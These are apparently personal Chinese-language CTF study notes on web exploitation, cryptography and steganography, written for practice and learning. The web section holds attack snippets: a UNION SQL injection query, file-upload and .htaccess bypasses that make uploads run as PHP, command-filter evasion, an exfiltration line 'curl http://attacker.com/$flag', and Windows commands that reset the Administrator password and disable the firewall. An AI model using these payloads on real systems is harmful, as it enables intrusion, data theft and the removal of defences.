- Web - 网络应用
- Reverse Engineering - 逆向
- Pwn - 二进制安全
  - Mobile - 移动安全

- Crypto - 密码学
- Misc - 杂项
  - 取证

# Web

Web题和渗透测试重合度高，首先参照[渗透测试笔记](./penetration.md)。此笔记记载CTF比赛会用到，但是实战中用处不大的技巧

## SQL注入

用Union注入拼接不同字符集的字段，可能导致`Illegal mix of collations for operation`错误，可用`convert`函数：

```sql
SELECT title FROM articles
UNION
SELECT group_concat(convert(column_name using gbk)) FROM information_schema.columns;
```

## 文件上传

- 后缀黑名单绕过
  - 大小写，双写
  - 冷门后缀：php可能解析`php5, pht, phtml, shtml, pwml, phar`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
  - 系统命名绕过：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
  - **`.user.ini`文件**：适用于PHP 5.3以上，需要服务器处于CGI / Fast CGI模式，且上传目录下有PHP脚本，比如index.php。构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行`01.gif`
  - **`.htaccess`文件**：适用于apache服务器，需要服务器配置`AllowOverride`（也有说法称需要开启`rewrite`模块、需要Thread Safe版本PHP）

- 后缀白名单绕过
  - 00截断：部分操作系统创建/重命名文件API把空字节当作字符串结束（C语言传统）。若服务器不做校验，可能服务器看到文件名是`shell.php%00.jpg`、`/shell.php%00/a.jpg`，操作系统创建文件名被截断编程`shell.php`。PHP<5.3.29且关闭magic quotes、JDK 6.0等有此漏洞

- MIME
- 文件头
  - 可能使用的php函数：
  - `exif_imagetype`，`finfo_file`：读取前几个字节，通过[File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)（也叫做文件头、Magic Number）识别文件格式
  - `getimagesize`：读取图片元数据。它不会检测文件是否合法，因此只要文件头正确、元数据所在位置有东西（即，文件够大）就有返回值



`.htaccess`文件：

```htaccess
# 将.pwn文件当作php解析
AddType application/x-httpd-php .pwn

# 将文件名包含pwn的文件作为php解析（CTF中也可以省略标签，直接把全部文件当作php解析）
<FilesMatch "pwn">
    Sethandler application/x-httpd-php
</FilesMatch>

# 本地文件包含
php_value auto_prepend_file /etc/passwd

# .htaccess关键词绕过。使用反斜杠续行
AddTy\
pe application/x-httpd-php .pwn
```

### 其他

XBM文件：一种纯文本图像格式，文件头两行如下

```c
#define width 16
#define height 16
```

PHP标签过滤：可以考虑使用`<script language="PHP"></script>`

## 代码审计

旧版本（PHP 7以前）弱类型漏洞较多。没有测旧版本，但是用PHP 8.2基本无法复现

参考：[CTF-PHP黑魔法](https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/)

- 数字比较缺陷
  - 比较两个字符串时可能都当作数字。`"42E+1" == "0042.0"`，`"1e1" == "0xa"`
  - 比较数字和字符串时只比较开头（应该是`intval`类型转换问题导致，详见`invtval`缺陷）。`"admin" == 0`，`"1admin" == 1`，`"0e12f" == "0e123456" == 0`
  - 列表总是大于数字、字符串。`['a'] > 'a'`
- 函数缺陷。部分函数遇到非法输入时不报错，而是返回一些奇怪的值
  - `intval`转换错误：`intval("42hello") = 42`，`intval("hello") = 0`
  - `md5, sha1`返回NULL：`md5(列表) = NULL`
  - `strcmp`返回0：`strcmp("abc", ["haha"])`
  - `ereg`（旧版本正则匹配）`%00`截断：`ereg("\d+", "123\x00-payload") = true`
  - `preg_match`返回0：`preg_match`

## 命令执行

### 基础知识

截断符号：继续执行`;`、管道符`|`、后台执行`&`、逻辑运算`||, &&`、换行符`\`。还可能用括号、引号闭合语句注入

Shell扩展：参考[Linux笔记](../system/Linux.md#Shell扩展)

### 绕过技巧

- 关键字过滤：可能限制指令、特殊字符、文件名
  - 类似指令。查看文件：`cat, tac, less, more, head, tail, nl, sort, rev, grep, strings`；读取并编码：`od, base64, xxd`；文本编辑：`vi, vim, nano`；`awk {print} flag.txt`；`sed -n p flag.txt`
  - 编码绕过：`echo "Y2F0IGZsYWcudHh0" | base64 -d | sh`，`echo 63617420666c61672e706870 | xxd -r -p | bash`
  - Shell扩展绕过
    - 引号移除：`c""at fla\g.txt`
    - 文件名扩展：`cat f[k-m]a?.txt`
    - 参数扩展：`x=ca;y=b;$x$y fl$9ag.txt`。还可利用环境变量，如`${PATH:6:1}`取环境变量第6个字符
- 空格过滤
  - 空白符`\t, ${IFS}, $IFS$9, %0d%0a`代替
  - 大括号扩展绕过：`{cat,flag.txt}`
  - 重定向绕过：`cat<flag.txt`
- 长度限制
- 回显限制
  - 用带外信息带出，如`curl http://attacker.com/$flag`
  - 盲注

以上大部分技巧适用于Linux。对于Windows系统命令提示符，还可尝试：

- `^`绕过：`wh^oami`

## 反序列化

### PHP

#### 简介

PHP的`serialize`函数将对象转换为字符串，其中包括了对象的类名、属性名和属性值；`unserialize`函数将字符串转换回对象

```php
class Connection {
    # 属性
    protected $db;
    private $user, $pass;
    # 方法
    private function connect(){
        $this->db = new PDO('mysql:host=localhost;dbname=test', $this->user, $this->pass);
    }
    # 魔术方法
    public function __construct($user, $pass){
        $this->user = $user;
        $this->pass = $pass;
    }
    public function __sleep(){
        return array('user', 'pass');
    }
    public function __wakeup(){
        // this->connect();
        echo "wakeup\n";
    }
    public function __destruct(){
        $this->db = null;
    }
}

$conn = new Connection("John Doe", "p@ssword");
echo serialize($conn);
'O:10:"Connection":2:{s:16:"Connectionuser";s:8:"John Doe";s:16:"Connectionpass";s:8:"p@ssword";}'
```

序列化字符串中，

- `O`：表示这是一个对象（数组则是A）
- `10:"Connection"`：类名长度为10，值为`Connection`
- `2`：有2个属性
- `s:16:"Connectionuser"`：第一个属性名，它是字符串（`s`），长度为16，名为`Connectionuser`（private属性名会加上一些别的东西，8.2版本是类名，其他版本也有加空字节的）
- `s:8:"John Doe"`：第一个属性值。含义同上

`__wakeup`，`__destruct`都是与反序列化漏洞强相关的魔术方法，反序列化必定调用它们；其他魔术方法也可能被调用。假如`__wakeup`中有危险代码，或服务器用反序列化得到的对象进行危险操作，控制序列化字符串就能进行攻击了。不过，开发者不太可能犯这么大的错，一般需要用后面几节的技术

注意：序列化字符串中可能有空字节，注意检查

#### POP链

面向属性编程链（Property-Oriented Programming Chain，也叫Gadget Chain）

#### phar文件

phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了phar元数据。PHP以`phar://`封装协议访问phar文件时会反序列元数据。结合文件上传漏洞 + 可以控制文件名的文件操作（例如`example.com/download?file=phar://phar.gif`）就能利用反序列化攻击

## 其他

伪造IP地址：`X-Forwarded-For, Client-IP, X-Real-IP, X-Remote-IP`

### 提权

```shell
# Windows系统改密码
net user Administrator $pw

# 关闭防火墙
netsh firewall set opmode disable

# 查看回收站文件
dir /a C:\$Recycle.Bin
type C:\Recycle.Bin\path-to-file
```

# Crypto

## 加密算法

### 古典密码

凯撒、栅栏、维吉尼亚；词频分析、暴力破解；CyberChef

- 替换密码：将每个字符按照替换为另一个字符
  - 凯撒密码：每个字母按照字母表顺序移动固定数目
  - 埃特巴什码：将字母表第一个字母替换为最后一个，第二个字母换为倒数第二个，以此类推
  - 弗吉尼亚密码：选定一个关键字，重复它直到长度与明文相同，将明文字母偏移到密钥对应字母，如某一位的明文是B，密钥是K，则密文是L（明文B是第二个字母，从密钥K开始数两个字母，得到密文L）
- 移位密码：字母不变，但位置更改
  - 栅栏密码

### 对称加密算法

优缺点：快；密钥分配与认证困难

分类：分组加密（又称为块密码）、流加密。前者将明文分割为固定长度的分组（如每64比特一组），每个分组分别加密。加密过程中通常经过多轮置换、代换等操作，安全性高。后者通过生成伪随机密钥流，与明文每一位做位运算（通常是异或），实时性好，但安全性不如分组加密。分组加密有ECB、CBC等[工作模式](https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F)

常用算法：DES，TripleDES，AES，RC4/5，IDEA

- DES（Data Encryption Standard，数据加密标准），分组加密算法，分组长度64 bit，密钥长度64 bit（56比特有效长度+8比特校验位）。密钥长度较短，有可能暴力破解
- TripleDES（也称作3DES），用DES对明文进行三次操作：K1加密、K2解密、K3加密。解密时则反过来，K3解密、K2加密、K1解密。其中K1和K3常用同一个密码
- AES，密钥长度128 / 192 / 256 bit（16 / 24 / 32 byte）
- IDEA



分组密码

- 初始化向量（IV，Initialization Vector）：为了避免相同明文加密得到相同密文从而暴露信息，除ECB以外的工作模式都引入了初始化向量让加密过程更“随机”。IV通常无需保密

- 填充：分组密码需要将消息填充到分组长度的整数倍。常用方法包括填0（Zero Padding）、填N个值为N的字节（PKCS7）、最后一字节为填充字节数，其余填0（ANSI X.923）

- 工作模式

  - ECB（电子密码本，Electronic Codebook）：将明文拆分为若干块，每个块独立加密。相同的块加密后也相同，因此可能暴露数据模式

  - CBC（密码块链接，Cipher Block Chaining）：第一个明文块与初始化向量（IV）异或后再加密；之后每个明文块与前一个密文块异或再加密



攻击：ECB模式弱点、Padding Oracle：pwntools

### 非对称加密算法

优缺点：密钥分发方便；慢

用途：保密通信、数字签名、对称密钥分发

RSA，ECC，背包，Rabin，DH

### 散列函数

特征：不可逆、无碰撞、雪崩

常用算法：MD5、SHA

用途：文件完整性校验、密码存储、身份认证（原理：$HMAC(key, message)$）

### 国密算法

国密算法是国家密码管理局认定的国产密码算法体系，目前包含

- 对称加密：SM1、4、7
- 非对称加密：SM2、9，基于ECC（椭圆曲线密码）
- 散列：SM3
- 流密码：ZUC

## 攻击

- 唯密文攻击：只拥有密文
- 已知明文攻击：拥有密文与对应的明文
- 选择明文攻击：拥有加密权限，能够对明文加密后获得相应密文
- 选择密文攻击：拥有解密权限，能够对密文解密后获得相应明文

# Misc

## 隐写

### 基础

```shell
file secret.zip                # 根据文件头探测文件格式
strings secret.zip | grep CTF  # 显示可打印字符，常能获得特殊编码信息
binwalk secret.zip             # 识别拼接在一起的文件。注意：有几率误报
binwalk -e secret.zip          # 拆分拼接的文件
```

小的文件也可以直接用010Editor人工检查
